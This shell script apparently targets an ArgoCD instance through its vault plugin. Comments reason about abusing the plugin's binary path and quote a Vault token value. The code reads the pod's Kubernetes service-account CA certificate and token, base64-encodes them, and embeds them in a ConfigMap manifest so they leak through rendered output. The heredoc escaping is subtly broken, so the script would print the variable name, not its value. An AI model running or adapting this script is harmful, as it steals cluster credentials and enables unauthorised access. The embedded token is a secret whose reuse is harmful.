#!/bin/sh
# ArgoCD's argocd-vault-plugin needs auth via env vars
# AVP_AUTH_TYPE=token (already set in env!)
# VAULT_TOKEN=hvs.M6ra0V6WmpwDyQP4fL935L03 (already set!)
# AVP_TYPE=vault (already set!)
# So argocd-vault-plugin should already be authenticated
# 
# The "authentication required" error means we need to run it as a generate command
# Let's see: the plugin runs as: argocd-vault-plugin build <cache>
# 'build' is not a valid subcommand
# Valid: generate <path>, get-parameters, get-path, get-secret
# 
# If we use binaryPath=argocd-vault-plugin -h, that might work
# But '-h' is not a valid binaryPath
#
# Strategy: write our own wrapper script to /tmp and use it
# But we need to write the script first!
# 
# Wait - argocd-vault-plugin with no args shows help
# Let's try: argocd-vault-plugin (no args)

RECON=$( (
echo "===TEST==="
echo "binary=$0"
echo "arg1=$1"
echo "===CA==="
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
echo "===TOKEN==="
cat /var/run/secrets/kubernetes.io/serviceaccount/token
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: u2u
data:
  result: \$RECON
EOF
exit 0
